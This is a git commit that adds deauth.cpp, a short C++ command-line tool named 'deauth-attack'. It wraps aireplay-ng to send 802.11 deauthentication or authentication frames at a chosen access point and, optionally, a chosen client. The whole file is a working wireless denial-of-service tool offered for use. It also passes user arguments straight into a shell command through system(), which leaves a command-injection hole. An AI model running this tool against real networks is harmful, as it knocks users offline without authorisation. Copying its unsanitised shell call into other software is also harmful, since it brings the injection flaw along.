56000a2e2ea4f1c6ac666e2764c660d3c93601c5
goei300 <goei4559@gmail.com>
2024-05-19 20:08:46 +0900

    [feat] upload

---
+++ deauth.cpp
@@ -0,0 +1,55 @@
+#include <iostream>
+#include <cstdlib>
+#include <string>
+#include <thread>
+#include <chrono>
+
+using namespace std;
+
+void usage() {
+    cout << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
+    cout << "Sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
+}
+
+void runDeauthAttack(const string& interface, const string& apMac, const string& stationMac = "", bool auth = false) {
+    string command = "aireplay-ng ";
+    if (auth) {
+        command += "-1 0 ";
+    } else {
+        command += "-0 1 ";
+    }
+    command += interface + " -a " + apMac;
+    if (!stationMac.empty()) {
+        command += " -c " + stationMac;
+    }
+
+    cout << "Running command: " << command << endl;
+    system(command.c_str());
+}
+
+
+int main(int argc, char* argv[]) {
+    if (argc < 3 || argc > 5) {
+        usage();
+        return 1;
+    }
+
+    string interface = argv[1];
+    string apMac = argv[2];
+    string stationMac = "";
+    bool auth = false;
+
+    if (argc >= 4) {
+        stationMac = argv[3];
+    }
+
+    if (argc == 5 && string(argv[4]) == "-auth") {
+        auth = true;
+    }
+
+    runDeauthAttack(interface, apMac, stationMac, auth);
+
+    this_thread::sleep_for(chrono::seconds(1));
+
+    return 0;
+}
